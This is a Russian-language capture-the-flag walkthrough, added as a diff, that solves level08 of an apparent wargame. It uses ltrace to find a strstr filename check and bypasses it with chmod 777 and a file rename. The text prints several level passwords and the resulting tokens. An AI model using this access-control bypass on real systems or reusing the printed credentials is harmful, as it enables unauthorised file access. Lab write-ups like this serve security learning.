@@ -1,0 +1,41 @@
+Вводим команду для перехода к следующему уровню
+
+>>su level08
+>>fiumuikeil55xe9cu4dood66h (токен полученный на предыдущем уровне)
+
+Переходим по пути 
+
+>>cd ~
+>>ls 
+
+Видим исполняемый файл level08, при запуске он выводит сообщение "./level08 [file to read]"
+и файл token, при попытке открыть его через cat выдает сообщение "cat: token: Permission denied"
+если запустить ./level08 token выдает сообщение "You may not access 'token'"
+Чтобы понять что он делает запустим его с отображением вызовов
+
+>>ltrace ./level08 token
+
+__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("token", "token")                                             = "token"
+printf("You may not access '%s'\n", "token"You may not access 'token'
+)                         = 27
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+
+Увидели, что он использует strstr, и в случае если передается файл с именем token, выдает ошибку
+Значит нужно изменить имя файла 
+
+>>chmod 777 .
+>>mv token new
+
+Запускаем исполняемый файл с полученным файлом
+
+>>./level08 new
+
+Получили токен от flag09
+
+>>su flag09
+>>quif5eloekouj29ke0vouxean
+>>getflag
+
+Получили токен 25749xKZ8L7DkSCwJkT9dyv6f
